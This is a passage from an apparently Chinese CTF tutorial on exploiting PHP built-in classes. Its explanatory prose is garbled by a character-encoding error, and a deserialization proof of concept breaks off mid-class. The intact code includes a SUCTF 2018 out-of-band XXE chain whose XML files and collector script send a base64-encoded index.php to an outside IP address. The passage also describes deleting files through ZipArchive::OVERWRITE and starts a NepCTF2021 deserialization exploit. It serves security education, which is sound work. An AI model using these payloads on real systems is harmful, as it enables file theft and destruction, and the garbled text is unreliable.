<p>è¿™æ ·çš„è¯ï¼Œå½“æˆ‘ä»¬å¯ä»¥æ§åˆ¶ç›®æ ‡è°ƒç”¨çš„ç±»çš„æ—¶å€™ï¼Œä¾¿å¯ä»¥é€šè¿‡ SimpleXMLElement è¿™ä¸ªå†…ç½®ç±»æ¥æ„é€  XXEã€‚</p>
<h3 id="ä¾‹é¢˜suctf-2018homework">ä¾‹é¢˜ï¼š[SUCTF 2018]Homework
</h3><p>è¿›å…¥é¢˜ç›®å…ˆæ³¨å†Œç™»å…¥ä¸€ä¸ªè´¦å·ï¼Œæœ‰ä¸€ä¸ªè®¡ç®—å™¨</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">calc</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">function</span> <span class="nf">__construct__</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">		<span class="nx">calc</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">function</span> <span class="nf">calc</span><span class="p">(</span><span class="nv">$args1</span><span class="p">,</span><span class="nv">$method</span><span class="p">,</span><span class="nv">$args2</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$args1</span><span class="o">=</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$args1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$args2</span><span class="o">=</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$args2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k">switch</span> <span class="p">(</span><span class="nv">$method</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="k">case</span> <span class="s1">&#39;a&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">				<span class="nv">$method</span><span class="o">=</span><span class="s2">&#34;+&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">				<span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">			<span class="k">case</span> <span class="s1">&#39;b&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">				<span class="nv">$method</span><span class="o">=</span><span class="s2">&#34;-&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">				<span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">			<span class="k">case</span> <span class="s1">&#39;c&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">				<span class="nv">$method</span><span class="o">=</span><span class="s2">&#34;*&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">				<span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">			<span class="k">case</span> <span class="s1">&#39;d&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">				<span class="nv">$method</span><span class="o">=</span><span class="s2">&#34;/&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">				<span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			
</span></span><span class="line"><span class="cl">			<span class="k">default</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">				<span class="k">die</span><span class="p">(</span><span class="s2">&#34;invalid input&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$Expression</span><span class="o">=</span><span class="nv">$args1</span><span class="o">.</span><span class="nv">$method</span><span class="o">.</span><span class="nv">$args2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="k">eval</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\$</span><span class="s2">r=</span><span class="si">$Expression</span><span class="s2">;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k">die</span><span class="p">(</span><span class="s2">&#34;Calculation results:&#34;</span><span class="o">.</span><span class="nv">$r</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">		
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ç‚¹å‡»è®¡ç®—å¯ä»¥çœ‹ä¼ å‚,è®¡ç®—2+2çš„ç»“æœ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/show.php?module=calc&amp;args[]=2&amp;args[]=a&amp;args[]=2
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ç§å½¢å¼è°ƒç”¨PHPä¸­çš„å†…ç½®ç±»ã€‚è¿™é‡Œæˆ‘ä»¬é€šè¿‡è°ƒç”¨ SimpleXMLElement è¿™ä¸ªå†…ç½®ç±»æ¥æ„é€  XXEã€‚</p>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬åœ¨vpsä¸Šæ„é€ å¦‚ä¸‹evil.xmlã€send.xmlå’Œsend.phpè¿™ä¸‰ä¸ªæ–‡ä»¶ã€‚</p>
<p>evil.xmlï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE ANY[
</span></span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY % remote SYSTEM &#34;http://47.122.53.248/send.xml&#34;&gt;</span>
</span></span><span class="line"><span class="cl">%remote;
</span></span><span class="line"><span class="cl">%all;
</span></span><span class="line"><span class="cl">%send;
</span></span><span class="line"><span class="cl">]&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>send.xmlï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY % file SYSTEM &#34;php://filter/read=convert.base64-encode/resource=index.php&#34;&gt;</span>
</span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY % all &#34;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://47.122.53.248/send.php?file=%file;&#39;&gt;</span>&#34;&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>send.phpï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
</span></span><span class="line"><span class="cl"><span class="nx">file_put_contents</span><span class="p">(</span><span class="s2">&#34;result.txt&#34;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])</span> <span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶ååœ¨urlä¸­æ„é€ å¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/show.php?module=SimpleXMLElement&amp;args[]=http://47.122.53.248/evil.xml&amp;args[]=2&amp;args[]=true
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™æ ·ç›®æ ‡ä¸»æœºå°±èƒ½å…ˆåŠ è½½æˆ‘ä»¬vpsä¸Šçš„evil.xmlï¼Œå†åŠ è½½send.xmlã€‚</p>
<h2 id="ä½¿ç”¨-ziparchive-ç±»æ¥åˆ é™¤æ–‡ä»¶">ä½¿ç”¨ ZipArchive ç±»æ¥åˆ é™¤æ–‡ä»¶
</h2><p><img src="/p/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/image-20250316165558379.png"
	width="1005"
	height="795"
	srcset="/p/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/image-20250316165558379_hu6163005823070388232.png 480w, /p/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/image-20250316165558379_hu8458272171222924577.png 1024w"
	loading="lazy"
	
		alt="image-20250316165558379"
	
	
		class="gallery-image" 
		data-flex-grow="126"
		data-flex-basis="303px"
	
></p>
<p>å¦‚æœè®¾ç½®flagså‚æ•°çš„å€¼ä¸º ZipArchive::OVERWRITE çš„è¯ï¼Œå¯ä»¥æŠŠæŒ‡å®šæ–‡ä»¶åˆ é™¤ã€‚è¿™é‡Œæˆ‘ä»¬è·Ÿè¿›æ–¹æ³•å¯ä»¥çœ‹åˆ°const OVERWRITE = 8ï¼Œä¹Ÿå°±æ˜¯å°†OVERWRITEå®šä¹‰ä¸ºäº†å¸¸é‡8ï¼Œæˆ‘ä»¬åœ¨è°ƒç”¨æ—¶ä¹Ÿå¯ä»¥ç›´æ¥å°†flagsèµ‹å€¼ä¸º8ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ZipArchiveåŸç”Ÿç±»è°ƒç”¨openæ–¹æ³•åˆ é™¤ç›®æ ‡ä¸»æœºä¸Šçš„æ–‡ä»¶ã€‚</p>
<h3 id="ä¾‹é¢˜nepctf2021-æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­">ä¾‹é¢˜ï¼šNepCTF2021 <strong>æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­</strong>
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s1">&#39;shell.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Game</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span>  <span class="nv">$username</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span>  <span class="nv">$password</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span>  <span class="nv">$choice</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span>  <span class="nv">$register</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span>  <span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span>  <span class="nv">$filename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span>  <span class="nv">$content</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span><span class="o">=</span><span class="s1">&#39;user&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="o">=</span><span class="s1">&#39;user&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">register</span><span class="p">)</span><span class="o">===</span><span class="s2">&#34;21232f297a57a5a743894a0e4a801fc3&#34;</span><span class="p">){</span>    <span class="c1">// admin
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">choice</span><span class="o">=</span><span class="k">new</span> <span class="nx">login</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">choice</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">register</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">choice</span><span class="o">-&gt;</span><span class="na">checking</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">login</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$filename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$content</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="nv">$filename</span><span class="p">,</span><span class="nv">$content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="o">=</span><span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="o">=</span><span class="nv">$filename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="o">=</span><span class="nv">$content</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">checking</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$password</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$username</span><span class="o">===</span><span class="s1">&#39;admin&#39;</span><span class="o">&amp;&amp;</span><span class="nv">$password</span><span class="o">===</span><span class="s1">&#39;admin&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="o">-&gt;</span><span class="na">open</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;login success you can to open shell file!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">register</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">checking</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$password</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$username</span><span class="o">===</span><span class="s1">&#39;admin&#39;</span><span class="o">&amp;&amp;</span><span class="nv">$password</span><span class="o">===</span><span class="s1">&#39;admin&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;success register admin&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;please register admin &#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Open</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">open</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$content</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;waf.txt&#39;</span><span class="p">)){</span>    <span class="c1">// å½“waf.txtæ²¡è¯»å–æˆåŠŸæ—¶æ‰èƒ½å¾—åˆ°flag
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nx">shell</span><span class="p">(</span><span class="nv">$content</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="o">.</span><span class="s2">&#34;.php&#34;</span><span class="p">);</span>    <span class="c1">// filename=php://filter/read=convert.base64-encode/resource=shell
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span><span class="o">!==</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">]</span><span class="o">&amp;&amp;</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span> <span class="o">===</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">]))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">sha1</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span><span class="o">===</span> <span class="nx">sha1</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">]))){</span>
</span></span><span class="line"><span class="cl">    <span class="o">@</span><span class="nx">unserialize</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;unser&#39;</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¼€å¤´åŒ…å«äº†shell.phpï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ ååºåˆ—åŒ–POCæ¥è¯»å–shell.phpï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Game</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span>  <span class="nv">$username</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span>  <span class="nv">$password</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span>  <span class="nv">$choice</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span>  <span class="nv">$register</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span>  <span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span>  <span class="nv">$filename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span>  <span class="nv">$content</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span><span class="o">=</span><span class="s1">&#39;user&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="o">=</span><span class="s1">&#39;user&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">register</span><span class="p">)</span><span class="o">===</span><span class="s2">&#34;21232f297a57a5a743894a0e4a801fc3&#34;</span><span class="p">){</span>    <span class="c1">// admin
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">choice</span><span class="o">=</span><span class="k">new</span> <span class="nx">login</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">choice</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">register</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">choice</span><span class="o">-&gt;</span><span class="na">checking</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">login</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$filename</span><span class="p">;</span>   
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$content</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Open</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">open</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$content</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
